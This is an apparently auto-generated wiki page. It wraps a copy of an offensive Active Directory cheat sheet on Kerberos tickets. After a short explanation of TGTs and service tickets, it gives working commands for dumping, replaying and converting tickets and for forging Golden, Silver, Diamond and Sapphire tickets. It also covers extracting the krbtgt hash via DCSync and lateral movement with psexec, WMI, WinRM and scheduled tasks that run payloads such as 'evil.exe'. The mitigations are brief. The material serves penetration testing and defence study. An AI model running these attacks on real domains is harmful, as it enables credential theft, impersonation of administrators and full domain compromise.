---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kerberos - Tickets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-kerberos-tickets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-tickets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberos - Tickets](../../topics/active-directory/kerberos-tickets.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-kerberos-tickets |
| name | Kerberos - Tickets |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/kerberos-tickets.md |

## Preserved Source Material

````yaml
_body: "# Kerberos - Tickets\n\nTickets are used to grant access to network resources. A ticket is a data structure that contains\
  \ information about the user's identity, the network service or resource being accessed, and the permissions or privileges\
  \ associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically\
  \ 8 to 12 hours.\n\nThere are two types of tickets in Kerberos:\n\n* **Ticket Granting Ticket** (TGT): The TGT is obtained\
  \ by the user during the initial authentication process. It is used to request additional service tickets without requiring\
  \ the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's\
  \ secret key.\n\n* **Service Ticket** (ST): The service ticket is used to access a specific network service or resource.\
  \ The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and\
  \ grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption\
  \ of the service's secret key.\n\n## Dump Kerberos Tickets\n\n* Mimikatz: `sekurlsa::tickets /export`\n* Rubeus\n\n  ```ps1\n\
  \  # List available tickets\n  Rubeus.exe triage\n\n  # Dump one ticket, the output is in Kirbi format\n  Rubeus.exe dump\
  \ /luid:0x12d1f7\n  ```\n\n## Replay Kerberos Tickets\n\n* Mimikatz: `mimikatz.exe \"kerberos::ptc C:\\temp\\TGT_Administrator@lab.local.ccache\"\
  `\n* netexec: `KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache`\n\n## Convert Kerberos Tickets\n\
  \nIn the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to\
  \ store Kerberos tickets.\n\n* A credential cache, or `\"ccache\"` is a temporary storage area for Kerberos tickets that\
  \ are obtained during the authentication process. The ccache contains the user's authentication credentials and is used\
  \ to access network resources without having to re-enter the user's credentials for each request.\n\n* The Kerberos Integrated\
  \ Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a\
  \ `\"kirbi\"` cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences\
  \ in the way it is structured and managed.\n\nWhile both caches serve the same basic purpose of storing Kerberos tickets\
  \ to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:\n\
  \n* kekeo: `misc::convert ccache ticket.kirbi`\n* impacket: `impacket-ticketConverter SRV01.kirbi SRV01.ccache`\n\n## Pass-the-Ticket\
  \ Golden Tickets\n\nA Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that allows an attacker to impersonate\
  \ any user — including Domain Admins — on a compromised Active Directory domain.\n\n**Requirements**:\n\n| Requirement \
  \      | Description |\n| ----------------- | ----------- |\n| Domain name       | corp.local  |\n| Domain SID        |\
  \ S-1-5-21-1234567890-2345678901-3456789012 |\n| KRBTGT NTLM hash  | The NTLM hash of the KRBTGT account |\n| Username \
  \         | Administrator |\n| (Optional) Groups | Add group SIDs for elevated access (e.g., Domain Admin) |\n\nAs a result\
  \ of `CVE-2021-42287` mitigations, the ticket cannot use a non-existent account name.\n\n> The way to forge a Golden Ticket\
  \ is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified\
  \ to ticketer.py, and the krbtgt NT hash must be used.\n\n### Golden Ticket Creation\n\n* Using **Ticketer**\n\n```powershell\n\
  python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \\\n  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \\\n  -domain\
  \ corp.local Administrator\n\npython3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \\\n  -domain-sid S-1-5-21-1234567890-2345678901-3456789012\
  \ \\\n  -domain corp.local \\\n  -user-id 500 \\\n  -extra-sid S-1-5-21-1234567890-2345678901-3456789012-512 \\\n  Administrator\n\
  ```\n\n* Using **Mimikatz**\n\n```powershell\n# Get info - Mimikatz\nlsadump::lsa /inject /name:krbtgt\nlsadump::lsa /patch\n\
  lsadump::trust /patch\nlsadump::dcsync /user:krbtgt\n\n# Forge a Golden ticket - Mimikatz\nkerberos::purge\nkerberos::golden\
  \ /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e\
  \ /ticket:evil.tck /ptt\nkerberos::tgt\n```\n\n* Using **Meterpreter**\n\n```powershell\n# Get info - Meterpreter(kiwi)\n\
  dcsync_ntlm krbtgt\ndcsync krbtgt\n\n# Forge a Golden ticket - Meterpreter\nload kiwi\ngolden_ticket_create -d <domainname>\
  \ -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>\ngolden_ticket_create\
  \ -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e\
  \ -t /root/Downloads/pentestlabuser.tck\nkerberos_ticket_purge\nkerberos_ticket_use /root/Downloads/pentestlabuser.tck\n\
  kerberos_ticket_list\n```\n\nGolden tickets with \"Enterprise admins\" SID can be used cross forest boundaries.\n\n**Mitigations**:\n\
  \n* Hard to detect because they are legit TGT tickets\n* Mimikatz generate a golden ticket with a life-span of 10 years\n\
  \n## Pass-the-Ticket Silver Tickets\n\nForging a Service Ticket (ST) require machine account password (key) or NT hash of\
  \ the service account.\n\n```powershell\n# Create a ticket for the service\nmimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN\
  \ /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE\n\n# Examples\nmimikatz $\
  \ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\
  \ /target:DESKTOP-01.adsec.local /service:cifs /ptt\nmimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775\
  \ /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park\n\n# Then use the\
  \ same steps as a Golden ticket\nmimikatz $ misc::convert ccache ticket.kirbi\n\nroot@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache\n\
  root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n```\n\nInteresting services\
  \ to target with a silver ticket :\n\n| Service Type                                | Service Silver Tickets | Attack |\n\
  |---------------------------------------------|------------------------|--------|\n| WMI                               \
  \          | HOST + RPCSS           | `wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create\
  \ \"cmd /c evil.exe\"`     |\n| PowerShell Remoting                         | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME\
  \ PSC -ComputerName DC01; Enter-PSSession -Name PSC` |\n| WinRM                                       | HTTP + wsman   \
  \        | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |\n| Scheduled Tasks                \
  \             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent\
  \ Health Check\" /IR \"C:/shell.ps1\"` |\n| Windows File Share (CIFS)                   | CIFS                   | `dir\
  \ \\\\dc01\\c$` |\n| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local\
  \ /user:krbtgt` |\n| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |\n\nMitigations:\n\n\
  * Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket.\n\
  \n## Pass-the-Ticket Diamond Tickets\n\n> Request a legit low-priv TGT and recalculate only the PAC field providing the\
  \ krbtgt encryption key\n\nRequirements:\n\n* krbtgt NT Hash\n* krbtgt AES key\n\n```ps1\nticketer.py -request -domain 'lab.local'\
  \ -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid\
  \ 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'\n\nRubeus.exe diamond /domain:DOMAIN /user:USER\
  \ /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS\n\
  ```\n\n## Pass-the-Ticket Sapphire Tickets\n\n> Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P)\
  \ (PKINIT).\n\nThe goal is to mimic the PAC field as close as possible to a legitimate one.\n\nRequirements:\n\n* [Impacket\
  \ PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)\n* krbtgt AES key\n\n```ps1\n# baduser argument will be\
  \ ignored\nticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey\
  \ 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'\n```\n\n## References\n\n* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)\n\
  * [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)\n* [How\
  \ To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)\n\
  * [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)\n* [A\
  \ Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)\n\
  * [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)\n\
  * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)\n*\
  \ [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)\n* [WONKACHALL\
  \ AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)\n* [WONKACHALL AKERVA\
  \ NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)\n* [WONKACHALL AKERVA NDH2018\
  \ – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)\n* [How To Attack Kerberos 101\
  \ - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)\n* [Kerberos (II): How\
  \ to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)"
_relative_path: active-directory/kerberos-tickets.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-tickets.md
````
